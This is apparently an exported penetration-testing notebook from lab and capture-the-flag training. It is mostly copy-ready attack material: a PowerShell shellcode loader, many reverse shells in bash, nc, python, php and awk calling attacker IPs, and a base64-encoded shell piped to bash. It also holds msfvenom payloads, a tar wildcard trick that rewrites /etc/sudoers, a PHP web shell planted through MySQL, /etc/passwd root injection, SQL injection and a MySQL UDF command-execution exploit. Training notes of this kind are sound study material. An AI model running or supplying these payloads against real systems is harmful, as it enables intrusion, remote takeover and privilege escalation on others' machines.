style="color:#d41919;font-weight:400">0x2</span>,<span style="color:#d41919;font-weight:400">0xd9</span>,<span style="color:#d41919;font-weight:400">0xc8</span>,<span style="color:#d41919;font-weight:400">0x5f</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0x83</span>,<span style="color:#d41919;font-weight:400">0xf8</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x7d</span>,<span style="color:#d41919;font-weight:400">0x22</span>,<span style="color:#d41919;font-weight:400">0x58</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x40</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x50</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0xb</span>,<span style="color:#d41919;font-weight:400">0x2f</span>,<span style="color:#d41919;font-weight:400">0xf</span>,<span style="color:#d41919;font-weight:400">0x30</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0x57</span>,<span style="color:#d41919;font-weight:400">0x68</span>,<span style="color:#d41919;font-weight:400">0x75</span>,<span style="color:#d41919;font-weight:400">0x6e</span>,<span style="color:#d41919;font-weight:400">0x4d</span>,<span style="color:#d41919;font-weight:400">0x61</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>,<span style="color:#d41919;font-weight:400">0x5e</span>,<span style="color:#d41919;font-weight:400">0x5e</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xc</span>,<span style="color:#d41919;font-weight:400">0x24</span>,<span style="color:#d41919;font-weight:400">0xe9</span>,<span style="color:#d41919;font-weight:400">0x71</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0x1</span>,<span style="color:#d41919;font-weight:400">0xc3</span>,<span style="color:#d41919;font-weight:400">0x29</span>,<span style="color:#d41919;font-weight:400">0xc6</span>,<span style="color:#d41919;font-weight:400">0x75</span>,<span style="color:#d41919;font-weight:400">0xc7</span>,<span style="color:#d41919;font-weight:400">0xc3</span>,<span style="color:#d41919;font-weight:400">0xbb</span>,<span style="color:#d41919;font-weight:400">0xf0</span>,<span style="color:#d41919;font-weight:400">0xb5</span>,<span style="color:#d41919;font-weight:400">0xa2</span>,<span style="color:#d41919;font-weight:400">0x56</span>,<span style="color:#d41919;font-weight:400">0x6a</span>,<span style="color:#d41919;font-weight:400">0x0</span>,<span style="color:#d41919;font-weight:400">0x53</span>,<span style="color:#d41919;font-weight:400">0xff</span>,<span style="color:#d41919;font-weight:400">0xd5</span>;<br /><br /><span style="color:#4a88f1;font-weight:700">$size</span> <span style="color:#bf2e5e;font-weight:400">=</span> <span style="color:#d41919;font-weight:400">0x1000</span>;<br /><br /><span style="color:#bf2e5e;font-weight:400">if</span> (<span style="color:#4a88f1;font-weight:700">$sc</span>.Length <span style="color:#bf2e5e;font-weight:400">-gt</span> <span style="color:#d41919;font-weight:400">0x1000</span>) {<span style="color:#4a88f1;font-weight:700">$size</span> <span style="color:#bf2e5e;font-weight:400">=</span> <span style="color:#4a88f1;font-weight:700">$sc</span>.Length};<br /><br /><span style="color:#4a88f1;font-weight:700">$x</span> <span style="color:#bf2e5e;font-weight:400">=</span> <span style="color:#4a88f1;font-weight:700">$winFunc</span><span style="color:#bf2e5e;font-weight:400">::</span>VirtualAlloc(<span style="color:#d41919;font-weight:400">0</span>,<span style="color:#4a88f1;font-weight:700">$size</span>,<span style="color:#d41919;font-weight:400">0x3000</span>,<span style="color:#d41919;font-weight:400">0x40</span>);<br /><br /><span style="color:#bf2e5e;font-weight:400">for</span> (<span style="color:#4a88f1;font-weight:700">$i</span><span style="color:#bf2e5e;font-weight:400">=</span><span style="color:#d41919;font-weight:400">0</span>;<span style="color:#4a88f1;font-weight:700">$i</span> <span style="color:#bf2e5e;font-weight:400">-le</span> (<span style="color:#4a88f1;font-weight:700">$sc</span>.<span style="color:#4a88f1;font-weight:400">Length-1</span>);<span style="color:#4a88f1;font-weight:700">$i</span><span style="color:#bf2e5e;font-weight:400">++</span>) {<span style="color:#4a88f1;font-weight:700">$winFunc</span><span style="color:#bf2e5e;font-weight:400">::</span>memset([IntPtr](<span style="color:#4a88f1;font-weight:700">$x</span>.ToInt32()<span style="color:#bf2e5e;font-weight:400">+</span><span style="color:#4a88f1;font-weight:700">$i</span>), <span style="color:#4a88f1;font-weight:700">$sc</span>[<span style="color:#4a88f1;font-weight:700">$i</span>], <span style="color:#d41919;font-weight:400">1</span>)};<br /><br /><span style="color:#4a88f1;font-weight:700">$winFunc</span><span style="color:#bf2e5e;font-weight:400">::</span>CreateThread(<span style="color:#d41919;font-weight:400">0</span>,<span style="color:#d41919;font-weight:400">0</span>,<span style="color:#4a88f1;font-weight:700">$x</span>,<span style="color:#d41919;font-weight:400">0</span>,<span style="color:#d41919;font-weight:400">0</span>,<span style="color:#d41919;font-weight:400">0</span>);<span style="color:#bf2e5e;font-weight:400">for</span> (;;) { <span style="color:#49aee6;font-weight:400">Start-sleep</span> <span style="color:#d41919;font-weight:400">60</span> };</pre></div><br /><br /></div><div class='page'><h1 class='title level-1'>Linux Notes</h1><br/><strong><span style="color:#ffff00;">Port Forwarding</span></strong><br />ssh -L 10000:127.0.0.1:10000 -f -N agent47@10.10.36.252<br /><br />forwards port on 10.10.36.252 port 10000 to 127.0.0.1 so you can go to localhost:10000 via browser<br /><br /><br />TO USE TARGET AS A PROXY VIA SSH TUNNELLING<br /><br />ssh -D 8080 daniel@panda.htb (also forwards port)<br /><br />SET SOCKS5 PROXY! It also resolves dns from host!<br /><br /><img src="images/4-1.png" alt="images/4-1.png" /><br /><br /><br />sqlmap -r file.txt ⇒ file.txt dump it from burpsuite<br /><br /><br />CRONJOB TAR Priv Esc<br />echo &#39;echo &quot;whiskeybar ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt; test.sh<br />echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;<br />echo &quot;&quot; &gt; --checkpoint=1<br />tar cf archive.tar *<br /><br /><br /><br />echo &#39;echo &quot;armour ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt; test.sh<br /><br /><strong>/etc/shadow password</strong><br />mkpasswd -m sha-512 -S saltsalt -s<br />$6$saltsalt$GxS6Vfi6tOltkmLXQYTE/Zii38DagGkYFnkVml1C6qM22u6JSntc3i8r1QxSKhSgD7O4/5E.kNRKyVF2Vr.Fh1<br /><br /><strong>/etc/passwd</strong><br />openssl passwd -1 -salt whiskeybar 1990<br />$1$whiskeyb$By7O9YyGFuRw4u3Zw84Dw/<br /><br /><strong>Reverse Shell </strong><br />bash -i &gt;&amp; /dev/tcp/10.10.16.39/6667 0&gt;&amp;1<br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.39 6667 &gt;/tmp/f<br /><h3>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.103/443 0&gt;&amp;1&quot;</h3><br /><br /><code>echo &quot;    HRI ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.39/6666 0&gt;&amp;1&#39; #&quot; &gt; /home/kid/logs/hackers</code><br />    HRI ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.39/6666 0&gt;&amp;1&#39; #<br />echo &quot; ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.39/6666 0&gt;&amp;1&#39; #&quot; &gt; hackers<br /><br /><br /><strong>get root bash</strong><br />chmod +s /bin/bash<br />bash -p<br /><br />msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.14.10.119 LPORT=6665 -f elf &gt; robot.elf<br /><br /><strong>find text in files</strong><br /><code>grep -rnw &#39;/path/to/somewhere/&#39; -e &#39;pattern&#39;</code><br /><br /><br />nc 192.168.49.223 6666 -e /bin/bash<br /><br /><strong>MYSQL CODE EXEC</strong><br />MySQL [wordpress]&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; INTO OUTFILE &quot;/var/www/https/blogblog/wp-content/uploads/shell.php&quot;;<br /><br /><strong>with</strong> <strong>tar run this can access root bash</strong><br /><code>#!/bin/bash<br />cp /bin/bash /tmp/bash<br />chmod +s /tmp/bash</code><br /><br />then run ./bash -p<br /><br /><strong>adding pub key and accessing via</strong><br />add pub key to /home/user/.ssh/authorized_keys<br />ssh-keygen -t rsa<br /><br />echo “key_file.pub_text” &gt; /home/user/.ssh/authorized_keys<br />ssh -i key_file user@10.0.0.0<br /><br />msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.16.32 LPORT=6665 -f elf &gt; robot.elf<br /><br /><br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.42 6666 &gt;/tmp/f<br /><br /><br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.181.137 6666 &gt;/tmp/f<br /><br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.17.106 6666 &gt;/tmp/f<br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.211 6666 &gt;/tmp/f<br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.49.211 6666 &gt;/tmp/f<br /><br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.252 6666 &gt;/tmp/f<br /><br /><br />python reverse<br /><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.42&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code><br /><br /><br /><br />php reverse<br /><code>&lt;?php<br />exec(&quot;/bin/bash -c &#39;bash -i &gt; /dev/tcp/192.168.49.211/7777 0&gt;&amp;1&#39;&quot;);</code><br /><br /><br />gobuster dir -u <a href="http://192.168.223.142">http://192.168.223.142</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,txt,html -t 40 <br /><br />meterpreter reverse shell<br />msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf<br /><br /><br /><strong>try parameters with backticks</strong><br /><a href="http://10.10.229.77:8081/ping?ip=`ls`">http://10.10.229.77:8081/ping?ip=`ls`</a><br /><a href="http://10.10.229.77:8081/ping?ip=`ls%20-la`">http://10.10.229.77:8081/ping?ip=`ls%20-la`</a><br /><br /><br /><strong>nc</strong> <strong>reverse</strong><br />msfvenom -p cmd/unix/reverse_bash lhost=10.11.17.106 lport=6666 R  -f elf &gt; chill.elf<br /><br /><strong>docker</strong><br />docker run -v /:/mnt --rm -it bash chroot /mnt sh<br /><br /><br /><strong>listening ports on host</strong><br />netstat -punta |grep -i listen<br /><br /><br /><br />awk &#39;BEGIN {s = &quot;/inet/tcp/0/10.10.16.42/6666&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null<br /><br /><strong>UDP</strong><br />Victim:<br />sh -i &gt;&amp; /dev/udp/10.10.16.42/6666 0&gt;&amp;1<br /><br />Listener:<br />nc -u -lvp 4242<br /><br />php -r &#39;$sock=fsockopen(&quot;192.168.49.211&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;<br /><br /><strong>TRY REVERSE SHELL WITH PORT 80!</strong><br /><code>;rm -f /tmp/x; mkfifo /tmp/x; /bin/sh -c &quot;cat /tmp/x | /bin/sh -i 2&gt;&amp;1 | nc 192.168.49.211 80 &gt; /tmp/x&quot;</code><br /><br /><strong><span style="color:#ffff00;">REVERSE SHELL BASE64</span></strong><br />echo -n &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.9/80 0&gt;&amp;1&#39; | base64<br /><code>echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzgwIDA+JjE= | base64 -d | bash</code><br /><br />restricted shell<br /><code>ssh username@IP -t &quot;bash --noprofile&quot;</code><br /><br />ssh 296640a3b825115a47b68fc44501c828@192.168.80.85 -t &quot;bash --noprofile&quot;<br /><br />ssh 296640a3b825115a47b68fc44501c828@192.168.80.85 -t &quot;/bin/bash&quot;<br /><br />ssh 296640a3b825115a47b68fc44501c828@192.168.80.85 -t &quot;sh&quot;<br /><br /><strong>subdomain search</strong><br />ffuf<br /><br />kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt<br />[*] Performing host and subdomain brute force against megacorpone.com<br />[*] 	 A router.megacorpone.com 38.100.193.71<br />[*] 	 A <a href="http://www.megacorpone.com">www.megacorpone.com</a> 38.100.193.76<br />[*] 	 A mail.megacorpone.com 38.100.193.84<br />[+] 3 Records Found<br /><br /><strong>php version</strong><br />curl I address<br />powered by php ...<br /><br /><strong><span style="color:#ffff00;">WORDPRESS PLUGIN ENUM</span></strong><br />wpscan --url <a href="http://192.168.250.23/wordpress">http://192.168.250.23/wordpress</a> --enumerate p<br /><br /><strong>go to wp-content/plugins manually</strong>!<br /><br />&lt;?php<br />exec(&quot;/bin/bash -c &#39;bash -i &gt; /dev/tcp/192.168.49.250/6666 0&gt;&amp;1&#39;&quot;);<br /><br /><strong>change /etc/passwd</strong><br /><br />kali@kali:~$ openssl passwd -1 -salt hacker pass123<br />$1$hacker$zVnrpoW2JQO5YUrLmAs.o1<br /><br />hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash<br /><br /><strong>SMTP RCE</strong><br />mail from: &lt;&gt;<br />rcp to: &lt;nobody+&quot;|ping -c4 192.168.49.186&quot;@localhost&gt;<br />data<br /><br />.<br />quit<br /><br /><br /><strong><span style="color:#ffff00;">DONT FORGET TO SNMP-CHECK</span></strong><strong> (SINCE UDP SCANS AREN&#39;T TRUSTABLE JUST RUN THE SCRIPT AND CHECK FOR THE PROCESSES THAT ARE RUNNING!)<br /></strong>snmp-check 192.168.186.42 <strong> </strong><br /><br /><strong><span style="color:#ff0000;">IF CAN&#39;T GET A REVERSE SHELL<br />MAKE SURE LISTENING PORT IS 80 22 OR STH COMMON!</span></strong><br /><br />SQL INJECTION TEST<br /><code>&#39;+UNION+SELECT+sleep(5);+--+-</code> (url encoded)<br />&#39; UNION SELECT SLEEP(10); -- <br /><br /><br /><strong><span style="color:#ffff00;">DIG DNS</span></strong><br />dig @10.13.37.10 -x 10.13.37.10<br /><em>dig</em> axfr @10.10.10.13 cronos.<em>htb</em><br /><br /><br />nmap vuln<br />nmap --script vuln 10.11.1.10<br /><br /><br /><strong><span style="color:#ffff00;">CHECK RUNNING PROCESS IF YOU HAVE ONLY FILE DOWNLOAD OR READ</span></strong><br /><br />download <br />/proc/sched_debug<br /><br />then you can check a running process by<br />/proc/pid/cmdline<br /><br /><strong><span style="color:#ffff00;">SUBDOMAIN ENUM(does not have to be in your /etc/hosts cause it sends a header!)</span></strong><br /><br />/root/go/bin/ffuf -c -u <a href="http://devzat.htb">http://devzat.htb</a> -H &quot;Host: FUZZ.devzat.htb&quot; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200<br /><br /><strong><span style="color:#ffff00;">This doesnt have to be in hosts either!</span></strong><br />gobuster vhost -u http://bolt.htb -t 30 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt<br /><br /><strong><span style="color:#ffff00;">Another</span></strong> <strong><span style="color:#ffff00;">tool</span></strong><br />kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt<br />[*] Performing host and subdomain brute force against megacorpone.com<br />[*] 	 A router.megacorpone.com 38.100.193.71<br />[*] 	 A <a href="http://www.megacorpone.com">www.megacorpone.com</a> 38.100.193.76<br />[*] 	 A mail.megacorpone.com 38.100.193.84<br />[+] 3 Records Found<br /><br /><strong><span style="color:#ffff00;">UNTAR FILES RECURSIVELY (EVERY FILE WILL BE UNTARED IN ITS OWN FOLDER)</span></strong><strong><span style="color:#ff0000;">({} means the name of the file that is found)</span></strong><br />find wordpress/ -type f -name *.tar.gz -execdir tar -xf {} \;<br /><br /><strong><span style="color:#ffff00;">Run multiple commands with ind -exec </span></strong><br />find -type f -name *.tar -execdir ls -la \; -execdir pwd \;<br /><br /><br /><strong><span style="color:#060f94;">RUSTSCAN ALL PORTS</span></strong><br />rustscan -a 192.168.215.183 -u 5000 -r 0-65535 -- -A <br /><br /><strong><span style="color:#060f94;">SUID BIT FIND MANUALLY</span></strong><br />find / -perm -u=s -type f 2&gt;/dev/null<br /><br /><strong><span style="color:#060f94;">CHECK FOR MOUNTS FILESYSTEM</span></strong><br /><br />cat /etc/fstab</div><div class='page'><h1 class='title level-2'>Port Forwarding</h1><br/><strong><span style="color:#ffff00;">SSH Local Port Forwarding</span></strong><br /><br /><img src="images/171-1.png" alt="images/171-1.png" /><br /><br /><span style="color:#237522;">• 0.0.0.0:445(Attacker a.b.c.d)<br />• 10.11.0.128(s.t.u.v)<br />• 192.168.1.110(Windows Server)</span> <strong><span style="color:#060f94;">(ssh command is run on the attacker kali computer)</span></strong><br /><br />sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128<br /><br /><strong><span style="color:#ffff00;">SSH Remote Port Forwarding</span></strong><br />The remote port forwarding feature in SSH can be thought of as the reverse of local port forwarding, in that a port is opened on the remote side of the connection and traffic sent to that port is forwarded to a port on our local machine (the machine initiating the SSH client).<br /><br /><img src="images/171-2.png" alt="images/171-2.png" /><br /><br />• <span style="color:#237522;">10.11.0.4 (kali a.b.c.d)<br />• 127.0.0.1 (Victim s.t.u.v) </span><strong><span style="color:#060f94;">(ssh command is run on the victim computer)</span></strong><br /><br />ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4<br /><br /><strong>Example:</strong><br />For security reasons, we want to avoid entering in our Kali password on a host we just compromised.<br />We can fix the first issue by passing in two optional flags to automatically accept the host key of our Kali machine. These are <strong>UserKnownHostsFile=/dev/null </strong>and <strong>StrictHostKeyChecking=no</strong>. The first option prevents ssh from attempting to save the host key by sending the output to /dev/null. The second option will instruct ssh to not prompt us to accept the host key. Both of these options can be set via the -o flag<br /><br /><br /><code>ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; kali@192.168.119.182 </code><br /><br /><strong><span style="color:#ffff00;"><br />SSH Dynamic Port Forwarding</span></strong><br />Now comes the really fun part. SSH dynamic port forwarding allows us to set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy.<br /><br /><img src="images/171-3.png" alt="images/171-3.png" /><br /><br /><br /><span style="color:#237522;">• 10.11.0.128 (Linux client s.t.u.v that has access to Windows Server network)</span><br /><br /><br /><span style="color:#060f94;">kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128</span><br /><br />To configure ProxyChains, we simply edit the main configuration file (/etc/proxychains.conf) and add our <strong><span style="color:#f66151;">SOCKS4</span></strong> proxy to it:<br /><br /><span style="color:#060f94;">kali@kali:~$ cat /etc/proxychains.conf</span><br />...<br /><br />[ProxyList]<br /># add proxy here ...<br /># meanwile<br /># defaults set to &quot;tor&quot;<br /><span style="color:#f66151;">socks4 	127.0.0.1 8080</span> <br /><br /><br /><span style="color:#f66151;">By default, ProxyChains will attempt to read its configuration file first from the current directory, then from the user&#39;s $(HOME)/.proxychains directory, and finally from /etc/proxychains.conf. This allows us to run tools through multiple dynamic tunnels, depending on our needs.</span><br /><br /><span style="color:#060f94;">kali@kali:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110</span><br />ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)<br /><br />Starting Nmap 7.60 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-04-19 18:18 EEST<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:443-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:23-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:80-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:8080-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:445-&lt;&gt;&lt;&gt;-OK<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:135-&lt;&gt;&lt;&gt;-OK<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:139-&lt;&gt;&lt;&gt;-OK<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:22-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:3389-&lt;&gt;&lt;&gt;-OK<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:1723-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:21-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:5900-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:111-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:25-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:53-&lt;&gt;&lt;&gt;-OK<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:993-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:3306-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:143-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:995-&lt;--timeout<br />|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:110-&lt;--timeout<br />Nmap scan report for 192.168.1.110<br />Host is up (0.17s latency).<br /><br />PORT     STATE  SERVICE<br />21/tcp   closed ftp<br />22/tcp   closed ssh<br />23/tcp   closed telnet<br />25/tcp   closed smtp<br />53/tcp   open   domain<br />80/tcp   closed http<br />110/tcp  closed pop3<br />111/tcp  closed rpcbind<br />135/tcp  open   msrpc<br />139/tcp  open   netbios-ssn<br />143/tcp  closed imap<br />443/tcp  closed https<br />445/tcp  open   microsoft-ds<br />993/tcp  closed imaps<br />995/tcp  closed pop3s<br />1723/tcp closed pptp<br />3306/tcp closed mysql<br />3389/tcp open   ms-wbt-server<br />5900/tcp closed vnc<br />8080/tcp closed http-proxy<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.54 seconds<br /><br /><br />=========================================================</div><div class='page'><h1 class='title level-1'>SQL Notes</h1><br/><code>http://10.10.87.36/admin?user=0 union select 1,2,3,4</code><br /><a href="https://roshanguragain.com.np/assets/images/TryHackMe/The_marketplace/Untitled%2012.png"><img src="images/11-1.png" alt="images/11-1.png" /></a><br /><br />So 1 and 2 are reflected.<br /><br /><strong>Get database name</strong><br /><code>http://10.10.87.36/admin?user=0 union select 1,database(),3,4</code><br /><br /><strong>Get tables</strong><br /><code>http://10.10.87.36/admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;marketplace&#39;</code><br /><br /><br />items,messages,users <br /><br /><code>http://10.10.87.36/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;messages&#39;</code><br /><br /><br /><code>0 union select 1,group_concat(message_content,0x2b,user_to),3,4 from messages</code> -- 2b = +<br /><br />@b_ENXkGYUCAv3zJ<br /><br /><table class="table"><tr><th>Database type</th><th>Query</th></tr><tr><td>Microsoft, MySQL</td><td>SELECT @@version</td></tr><tr><td>Oracle</td><td>SELECT * FROM v$version</td></tr><tr><td>PostgreSQL</td><td>SELECT version()</td></tr></table><br />For example, you could use a <code>UNION</code> attack with the following input: <br />					<code>&#39; UNION SELECT @@version--</code><br /><br /><br />On Oracle, every <code>SELECT</code> query must use the <code>FROM</code> keyword and specify a valid table. There is a built-in table on Oracle called <code>dual</code> which can be used for this purpose. So the injected queries on Oracle would need to look like:                     <br />                    <code>&#39; UNION SELECT NULL FROM DUAL--</code>                <br /><br /><br />1.   Use Burp Suite to intercept and modify the request that sets the product category filter.                    <br />2.  Determine the <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">number of columns that are being returned by the query</a> and <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">which columns contain text data</a>. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the <code>category</code> parameter:                         <br />                        <code>&#39;+UNION+SELECT+&#39;abc&#39;,&#39;def&#39;+FROM+dual--</code>                    <br />3.  Use the following payload to display the database version:                         <br />                        <code>&#39;+UNION+SELECT+BANNER,+NULL+FROM+v$version--</code>                    <br />                            <br /><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a><br /><br /><br /><br /><h2>Retrieving multiple values within a single column</h2><br />                     In the preceding example, suppose instead that the query only returns a single column.         <br />                     You can easily retrieve multiple values together within this  single column by concatenating the values together, ideally including a  suitable separator to let you distinguish the combined values. For  example, on Oracle you could submit the input:         <br />        <code>&#39; UNION SELECT username || &#39;~&#39; || password FROM users--</code></div><div class='page'><h1 class='title level-2'>Exploit</h1><br/><br />git clone <a href="https://github.com/mysqludf/lib_mysqludf_sys.git">https://github.com/mysqludf/lib_mysqludf_sys.git</a><br /><br /><br /><code>xxd -p lib_mysqludf_sys.so | tr -d &#39;\n&#39; &gt; lib_mysqludf_sys.so.hex</code><br /><br />set @shell =0x[here goes the hex file];<br /><br />select @@plugin_dir;<br /><br /><code>select binary @shell into dumpfile &#39;/home/dev/plugin/udf_sys_exec.so&#39;;</code><br /><br /><code>select sys_exec(&#39;chmod +x ./shell.elf&#39;);</code> --to run commands</div><div class='page'><h1 class='title level-1'>AD Notes</h1><br/></div><div class='page'><h1 class='title level-2'>AD Enum</h1><br/></div><div class='page'><h1 class='title level-3'>Powershell User Enum Script</h1><br/>AD User Enumeration through Powershell Script (offsec):<br /><br />$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br /><br />$PDC = ($domainObj.PdcRoleOwner).Name<br /><br />$SearchString = &quot;LDAP://&quot;<br /><br />$SearchString += $PDC + &quot;/&quot;<br /><br />$DistinguishedName = &quot;DC=$($domainObj.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot;<br /><br />$SearchString += $DistinguishedName<br /><br />$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)<br /><br />$objDomain = New-Object System.DirectoryServices.DirectoryEntry<br /><br />$Searcher.SearchRoot = $objDomain<br /><br /><strong><span style="color:#ffff00;">$Searcher.filter=&quot;samAccountType=805306368&quot; # gets all users</span></strong> 805306368=0x30000000<br /><br />$Result = $Searcher.FindAll()<br /># $Searcher.filter=&quot;name=Jeff_Admin&quot; # for a specific user<br /><br />Foreach($obj in $Result)<br />{<br />    Foreach($prop in $obj.Properties)<br />    {<br />        $prop<br />    }<br />    <br />    Write-Host &quot;------------------------&quot;<br />}</div><div class='page'><h1 class='title level-3'>Powershell Group Enum Script</h1><br/>$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br /><br />$PDC = ($domainObj.PdcRoleOwner).Name<br /><br />$SearchString = &quot;LDAP://&quot;<br /><br />$SearchString += $PDC + &quot;/&quot;<br /><br />$DistinguishedName = &quot;DC=$($domainObj.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot;<br /><br />$SearchString += $DistinguishedName<br /><br />$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)<br /><br />$objDomain = New-Object System.DirectoryServices.DirectoryEntry<br /><br />$Searcher.SearchRoot = $objDomain<br /><br /><strong><span 